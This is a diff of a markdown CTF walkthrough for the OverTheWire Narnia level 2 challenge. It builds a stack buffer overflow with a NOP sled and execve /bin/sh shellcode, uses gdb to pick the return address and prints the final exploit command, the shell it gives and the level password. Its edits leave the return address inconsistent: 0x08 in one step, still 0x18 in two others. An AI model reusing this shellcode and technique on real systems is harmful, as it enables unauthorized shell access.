@@ -205,7 +205,7 @@ b *0x0804849c
 - We choose [Shellcode 811](http://shell-storm.org/shellcode/files/shellcode-811.php) from shell-storm, which accounts for 28 Bytes
 - Further, let's replace A with NOP a.k.a. `\x90`
 - Interim result #1: `$(python -c "print '\x90' * (136-4-28) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'CCCC'")`
-- We start with `gdb -q narnia2` and inside gdb `b *0x0804849c` (the address at leave)
+- We start `gdb -q narnia2` and inside gdb `b *0x0804849c` (the address at leave)
 - Then we run the interim result #1 inside gdb: `r [our payload]`
 - At breakpoint 1 we check the address of EIP: `i f` (info frame)
 - And the content of ESP: `x/40wx $esp` (dump 40 words of ESP in hex-format)
@@ -214,11 +214,11 @@ b *0x0804849c
 
 ![grafik](https://user-images.githubusercontent.com/84674087/143502597-d42138da-bf9f-4cb3-b96e-f5a51e4bb8b4.png)
 
-- We can clearly see all the NOPs, the shellcode and CCCC at EIP address xffffd63c
+- We can clearly see all the NOPs, the shellcode and CCCC at EIP address `xffffd63c`
 - Next step is the execution of our shellcode. To do so, we need to place an address inside EIP which redirects into our NOP field
 - If so, all NOPs gets executed (without no effect upon the running program) until it reaches our shellcode
-- From the picture above we can select any memory address from NOP: `0xffffd618` as example
-- Remember to write in little-endian order: `\x18\xd6\xff\xff`
+- From the picture above we can select any memory address from NOP: `0xffffd608` as example
+- Remember to write in little-endian order: `\x08\xd6\xff\xff`
 - Interim result #2: `r $(python -c "print '\x90' * (136-4-28) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x18\xd6\xff\xff'")`
 
 ![grafik](https://user-images.githubusercontent.com/84674087/143503139-bbd6b1ed-6215-498d-95d4-0f71f44c6abf.png)
@@ -230,8 +230,8 @@ b *0x0804849c
 
 ![grafik](https://user-images.githubusercontent.com/84674087/143503465-7cb82e94-3279-4183-bf70-76f72ee441ee.png)
 
-- Thus, we pull our shellcode  10 bytes to the left and fill the gap after the shellcode with NOPs: (136-4-28) --> (136-4-38)
-- Interim result #3: `r $(python -c "print '\x90' * (136-4-38) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90' * 10 + '\x18\xd6\xff\xff'")
+- Thus, we pull our shellcode 10 bytes to the left and fill the gap after the shellcode with NOPs: (136-4-28) --> (136-4-38)
+- Interim result #3: `r $(python -c "print '\x90' * (136-4-38) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90' * 10 + '\x08\xd6\xff\xff'")`
 - Let's try it again
 
 ![grafik](https://user-images.githubusercontent.com/84674087/143503696-d9e71196-beca-4593-b4bf-81f0804dbfc3.png)
@@ -241,8 +241,5 @@ b *0x0804849c
 - `./narnia2 $(python -c "print '\x90' * (136-4-38) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90' * 10 + '\x18\xd6\xff\xff'")`
 - Success ! We get the shell and enter `cat /etc/narnia_pass/narnia3`
 - **PASSWORD:** vaequeezee
-
-
-![grafik](https://user-images.githubusercontent.com/84674087/143498192-f96ebd61-e18c-45ed-bc90-8fcae3e9faaa.png)
 
 <br />
